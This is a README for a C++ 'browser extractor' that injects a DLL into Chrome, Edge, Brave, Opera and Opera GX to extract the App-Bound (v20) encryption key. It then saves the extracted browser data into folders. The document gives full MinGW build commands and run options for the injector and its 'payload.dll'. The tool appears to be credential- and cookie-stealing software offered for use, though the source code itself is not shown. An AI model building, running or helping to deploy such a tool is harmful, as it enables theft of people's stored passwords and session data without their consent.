# C++ Browser Extractor

This is a C++ browser extractor project supporting Chrome, Edge, Brave, Opera, and Opera GX.

## Project Structure

- `injector/`: The main executable that performs data extraction and injection if needed.
- `proxydll/`: The minimal DLL injected into browsers for v20 (App-Bound) key extraction.

## Build Instructions (MinGW-w64)

### 1. Build the Proxy DLL

```bash
# Build the DLL
x86_64-w64-mingw32-g++ -O2 -shared proxydll/src/lib.cpp -o payload.dll -lbcrypt -lcrypt32 -lole32 -loleaut32 -lshlwapi -static
```

### 2. Build the Injector

```bash
# Compile sqlite3 separately (from proxydll/src/)
x86_64-w64-mingw32-gcc -O2 -c proxydll/src/sqlite3.c -o sqlite3.o

# Build the injector
x86_64-w64-mingw32-g++ -O2 injector/src/main.cpp sqlite3.o -Iproxydll/src/ -o injector.exe -lbcrypt -lcrypt32 -lole32 -loleaut32 -lshlwapi -static
```

## Usage

1. Build both components.
2. Run `injector.exe`. It will look for `payload.dll` in the same directory.
3. Extracted data will be saved in folders named after the browsers.

Options:
- `-b, --browser <name>`: Target a specific browser (chrome, edge, brave, opera, operagx, all). Default is `all`.
